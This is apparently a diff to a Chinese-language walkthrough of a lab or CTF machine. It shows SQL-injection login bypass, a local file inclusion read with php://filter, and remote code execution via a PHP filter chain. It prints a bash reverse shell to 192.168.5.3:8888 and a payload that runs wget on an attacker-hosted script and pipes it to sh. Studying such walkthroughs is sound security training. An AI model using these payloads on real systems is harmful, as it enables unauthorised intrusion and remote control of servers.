@@ -16,20 +16,30 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-80 web 扫描出 http://192.168.5.40/library/login/ 登陆窗存在 sql 注入，这时用户名和密码都输入 `1' or 1=1 -- -` 就可以进入系统，访问 About 页面存在 LFI 漏洞: http://192.168.5.40/library/admin/index.php?lang=es.php
+80 web 扫描出 http://192.168.5.40/library/login/ 登陆窗存在 sql 注入，这时用户名和密码都输入 `1' or 1=1 -- -` 就可以进入系统，访问 About 页面存在 LFI 漏洞: http://192.168.5.40/library/
+admin/index.php?lang=es.php
 
-直接使用 php_filter_chain 进行 rce：
+使用 php filter base64 尝试读取 index.php 的源文件:
 
-创建 8 文件
+```
+lang=php://filter/read=convert.base64-encode/resource=index.php
+
+<?php
+$lang = isset($_GET['lang']) ? $_GET['lang'] : '';
+include($lang)
+?>
+```
+
+显示 include，直接使用 php_filter_chain 进行 rce：
+
+创建 8 文件:
 
 ```
 #!/bin/bash
 /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"
 ```
 
-在 kali 上创建 http web。
-
-生成利用代码(这里要控制 chain 后的长度，否则超过 apache 限制长度执行不了)：
+在 kali 上创建 http web，生成利用代码(这里要控制 chain 后的长度，ip 转换成数字，否则超过 apache 限制长度执行不了)：
 
 ```
 python3 ~/tools/py-tools/php_filter_chain_generator.py --chain '<?=`wget -q -O- 3232236803/8|sh`;?>'
